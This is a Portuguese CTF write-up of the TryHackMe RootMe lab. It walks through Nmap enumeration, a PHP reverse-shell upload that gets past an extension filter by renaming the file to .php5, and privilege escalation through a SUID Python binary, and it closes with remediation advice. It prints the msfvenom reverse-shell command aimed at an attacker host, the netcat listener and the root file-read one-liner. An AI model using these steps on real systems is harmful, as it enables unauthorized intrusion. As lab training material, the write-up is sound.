# 🔍 RootMe — CTF Writeup
### TryHackMe | Boot-to-Root | Enumeração Web · Upload de Web Shell · Escalada de Privilégios via SUID Python

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 21/07/2026                                                                             |
| **Data do Pentest**   | 21/07/2026                                                                             |
| **Alvo**              | `10.66.155.162` — TryHackMe · RootMe                                                   |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Msfvenom (Metasploit Framework) · Netcat · GTFOBins · Python 2.7          |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **RootMe** (TryHackMe) por meio de reconhecimento de rede com Nmap, identificação de um formulário de upload de arquivos sem validação de conteúdo, envio de um web shell PHP com **bypass de filtro de extensão** (renomeação para `.php5`) e escalada de privilégios explorando um binário **Python 2.7 com bit SUID** configurado indevidamente. Nenhuma vulnerabilidade CVE foi necessária — o comprometimento total dependeu exclusivamente de **falhas de configuração, validação inadequada de entrada e má gestão de permissões**. As flags `user.txt` e `root.txt` foram capturadas com sucesso, confirmando o comprometimento total (root) do sistema.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta          | Versão     | Finalidade                                                                          |
|---------------------|------------|--------------------------------------------------------------------------------------|
| **Nmap**            | 7.99       | Varredura de portas e fingerprinting de serviços (`-sV -sC`)                        |
| **Navegador Web**   | Firefox    | Enumeração manual de diretórios e interação com o formulário de upload              |
| **Msfvenom**        | Metasploit | Geração do payload PHP reverse shell (`php/reverse_php`)                            |
| **Netcat**          | `nc`       | Listener para recepção da conexão reversa (`nc -lnvp 4444`)                          |
| **GTFOBins**        | —          | Consulta de técnica de exploração para binário `python` com SUID                     |
| **Python 2.7**      | sistema    | Escalada de privilégios via leitura arbitrária de arquivo (`File read` — SUID)       |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

**Comando:** `nmap -sV -sC 10.66.155.162`

A varredura com detecção de serviços e scripts padrão (`-sV -sC`) identificou **dois serviços expostos**:

```
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http  Apache httpd 2.4.41 (Ubuntu)
         http-title: HackIT - Home
         http-cookie-flags: PHPSESSID → httponly flag NOT set
```

Informações adicionais relevantes do scan:

```
OS: Linux 5.x/6.x (96% confiança)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Uptime: ~36,8 dias (desde 14/06/2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
```

O cookie de sessão **PHPSESSID** foi identificado **sem a flag `httponly`** configurada — uma fraqueza de configuração relevante, ainda que não explorada diretamente nesta cadeia de ataque.

📸 *Figura 1 — Resultado da varredura Nmap: portas 22 (SSH) e 80 (HTTP) abertas, serviço Apache identificado*

---

### FASE 2 — Enumeração Web: Página Inicial + Formulário de Upload

O acesso a `http://10.66.155.162` exibiu uma página estilizada como terminal, com o banner:

```
root@rootme:~#
Can you root me?
```

Um convite temático típico de máquinas *boot-to-root*, sinalizando diretamente o objetivo do desafio.

📸 *Figura 2 — Página inicial do serviço web (HackIT - Home) com o desafio "Can you root me?"*

A enumeração manual de diretórios identificou o recurso **`/panel/`**: uma página de **upload de arquivos sem qualquer autenticação**, permitindo — a princípio — o envio de arquivos arbitrários ao servidor.

📸 *Figura 3 — Formulário de upload de arquivos encontrado em `/panel/`, sem validação de tipo de arquivo*

---

### FASE 3 — Upload de Web Shell: Msfvenom + Bypass de Filtro de Extensão

**Comando:** `msfvenom -p php/reverse_php LHOST=192.168.141.198 LPORT=4444 -o shell.php`

Um payload PHP reverse shell foi gerado com o Msfvenom (**2615 bytes**), apontando para o host do atacante (`192.168.141.198:4444`).

```
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2615 bytes
Saved as: shell.php
```

📸 *Figura 4 — Geração do payload PHP reverse shell com Msfvenom, salvo como `shell.php`*

A primeira tentativa de upload do arquivo com a extensão **`.php`** foi bloqueada pelo filtro de validação do formulário em `/panel/`. Para contornar a restrição, o arquivo foi renomeado para **`shell.php5`** — extensão alternativa que o Apache, por padrão, também interpreta como código PHP executável — e o upload foi **aceito com sucesso**, ficando acessível em `http://10.66.155.162/uploads/shell.php5`.

Com o listener netcat em escuta (`nc -lnvp 4444`), o acesso ao arquivo `shell.php5` disparou a execução do payload, retornando uma conexão reversa imediatamente:

```
listening on [any] 4444 ...
connect to [192.168.141.198] from (UNKNOWN) [10.66.155.162] 40710
```

📸 *Figura 5 — Bypass do filtro de extensão: arquivo enviado como `shell.php5` (aceito pelo servidor) e conexão reversa recebida no listener netcat*

---

### FASE 4 — Acesso Inicial: Shell como www-data + Captura de user.txt

Com a shell reversa estabelecida como o usuário **`www-data`**, a enumeração do sistema de arquivos localizou a flag de usuário:

**Comando:** `find / -type f -name "user.txt" 2>/dev/null`

```
whoami
www-data

find / -type f -name "user.txt" 2>/dev/null
/var/www/user.txt

cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

> 🚩 **user.txt — FLAG CAPTURADA: `THM{y0u_g0t_a_sh3ll}`**

📸 *Figura 6 — Shell obtida como `www-data` e localização/captura da flag `user.txt` em `/var/www/user.txt`*

---

### FASE 5 — Escalada de Privilégios: SUID Python 2.7 + Captura de root.txt

**Vetor:** Binário `/usr/bin/python2.7` com bit **SUID** configurado indevidamente.

**Comando:** `find / -type f -perm -4000 2>/dev/null`

A enumeração de binários com o bit SUID configurado revelou, entre diversos binários padrão do sistema, o executável **`/usr/bin/python2.7`** com permissão SUID atribuída — uma má configuração crítica, já que o interpretador Python permite a execução de código arbitrário com os privilégios efetivos do dono do arquivo (root).

```
find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/python2.7   ← binário SUID crítico
/usr/bin/sudo
/usr/bin/pkexec
...
```

A consulta ao **GTFOBins** (`gtfobins.org/gtfobins/python`) confirmou a técnica **"File read"** para binários Python com SUID configurado, permitindo a leitura de **qualquer arquivo do sistema com privilégios efetivos de root**, sem a necessidade de obter uma shell completa como root:

```
python -c 'print(open("/path/to/input-file").read())'
```

📸 *Figura 7 — Enumeração de binários SUID via `find`; `/usr/bin/python2.7` identificado como vetor de escalada, consulta ao GTFOBins*

A técnica foi aplicada diretamente sobre o arquivo `/root/root.txt`:

**Comando:** `python2.7 -c 'print(open("/root/root.txt").read())'`

```
python2.7 -c 'print(open("/root/root.txt").read())'
THM{pr1v1l3g3_3sc4l4t10n}
```

O conteúdo da flag foi exibido imediatamente, **mesmo sem uma sessão de shell interativa** com privilégios de root.

> 🚩 **root.txt — FLAG CAPTURADA: `THM{pr1v1l3g3_3sc4l4t10n}`**

📸 *Figura 8 — Execução do GTFOBins (File read) via `python2.7` SUID, captura do conteúdo de `/root/root.txt`*

---

## ⛓ Linha do Tempo do Comprometimento

```
FASE 1 — RECONHECIMENTO (Nmap 7.99)
    nmap -sV -sC 10.66.155.162
    Portas abertas: 22/TCP (OpenSSH 8.2p1) · 80/TCP (Apache 2.4.41)
    Cookie PHPSESSID sem httponly · Uptime ~36,8 dias
    ↓
FASE 2 — ENUMERAÇÃO WEB
    Página inicial "HackIT - Home" → "Can you root me?"
    Enumeração manual → /panel/ (formulário de upload sem autenticação)
    ↓
FASE 3 — UPLOAD DE WEB SHELL (Msfvenom)
    msfvenom -p php/reverse_php LHOST=192.168.141.198 LPORT=4444 -o shell.php
    Upload .php bloqueado → bypass renomeando para shell.php5 → aceito
    nc -lnvp 4444 → conexão reversa recebida
    ↓
FASE 4 — ACESSO INICIAL (www-data)
    whoami → www-data
    find / -name "user.txt" → /var/www/user.txt
    FLAG user.txt: THM{y0u_g0t_a_sh3ll} ✓
    ↓
FASE 5 — ESCALADA DE PRIVILÉGIOS (SUID Python 2.7)
    find / -perm -4000 → /usr/bin/python2.7 (SUID)
    GTFOBins → File read: python2.7 -c 'print(open("/root/root.txt").read())'
    FLAG root.txt: THM{pr1v1l3g3_3sc4l4t10n} ✓
    ↓
COMPROMETIMENTO TOTAL — leitura arbitrária com privilégios de root
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap 7.99 (`-sV -sC`) | Portas 22 (SSH) e 80 (HTTP) abertas; cookie sem `httponly` |
| Enumeração Web | Browser (enumeração manual) | `/panel/` — formulário de upload sem autenticação nem validação |
| Exploração | Msfvenom (`php/reverse_php`) | Payload PHP reverse shell gerado; bypass de filtro via `.php5` |
| Acesso Inicial | Netcat listener | Shell reversa como `www-data`; `user.txt` capturado |
| Escalada de Privilégio | `find -perm -4000` + GTFOBins | `/usr/bin/python2.7` SUID → leitura arbitrária como root; `root.txt` capturado |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.66.155.162` | Máquina RootMe (TryHackMe) — Apache 2.4.41, OpenSSH 8.2p1 |
| Serviços expostos | `22/TCP` (OpenSSH 8.2p1) · `80/TCP` (Apache 2.4.41) | Superfície de ataque inicial |
| Falha de configuração | Cookie `PHPSESSID` sem `httponly` | Exposição a roubo de sessão via XSS (não explorado nesta cadeia) |
| Endpoint vulnerável | `/panel/` | Upload de arquivos sem autenticação e sem validação real de tipo/conteúdo |
| Payload | `shell.php` → renomeado para `shell.php5` (2615 bytes) | Web shell PHP gerado via Msfvenom (`php/reverse_php`) |
| Bypass de filtro | Extensão `.php5` | Extensão alternativa interpretada como PHP executável pelo Apache |
| Arquivo crítico | `/usr/bin/python2.7` | Binário com bit SUID configurado indevidamente |
| Payload de escalada | `python2.7 -c 'print(open("/root/root.txt").read())'` | Leitura arbitrária de arquivo via GTFOBins (SUID — Python) |
| Flag user | `THM{y0u_g0t_a_sh3ll}` | `/var/www/user.txt` |
| Flag root | `THM{pr1v1l3g3_3sc4l4t10n}` | `/root/root.txt` |
| Técnica (MITRE ATT&CK) | `T1190` | Exploit Public-Facing Application |
| Técnica (MITRE ATT&CK) | `T1548.001` | Abuse Elevation Control Mechanism: Setuid and Setgid |

---

## ✅ Resumo das Flags

| # | Flag | Valor |
|---|------|-------|
| 🚩 user.txt | `/var/www/user.txt` | `THM{y0u_g0t_a_sh3ll}` |
| 🚩 root.txt | `/root/root.txt` | `THM{pr1v1l3g3_3sc4l4t10n}` |

---

## 🛡 Recomendações

- **Implementar validação rigorosa de tipo de arquivo** no upload: whitelist de extensões e verificação de MIME/conteúdo real, não apenas a extensão informada
- **Bloquear explicitamente todas as extensões executáveis pelo Apache** (`.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phtml` etc.), e não apenas `.php`
- **Armazenar arquivos enviados por usuários fora do webroot**, ou impedir a execução de scripts no diretório de uploads (ex.: via configuração do Apache/`.htaccess`)
- **Revisar e remover permissões SUID** de interpretadores e binários que permitam execução/leitura arbitrária, como `python2.7`
- **Princípio do menor privilégio**: nenhum binário interpretado deveria ter o bit SUID habilitado sem necessidade explícita e controlada
- **Manter o cookie de sessão `PHPSESSID`** com as flags `HttpOnly` e `Secure` habilitadas
- **Atualizar e substituir dependências legadas**, como o interpretador Python 2.7 — descontinuado desde janeiro de 2020 (EOL)
- **Exigir autenticação** para acesso a qualquer endpoint de upload de arquivos, como o identificado em `/panel/`

---

## 📚 Referências

- [TryHackMe — RootMe](https://tryhackme.com/room/rrootme)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Metasploit — Msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [GTFOBins — SUID Python](https://gtfobins.github.io/gtfobins/python/)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/)

---

*Writeup elaborado por Mauricio Robert — Faculdade Impacta | Julho 2026*
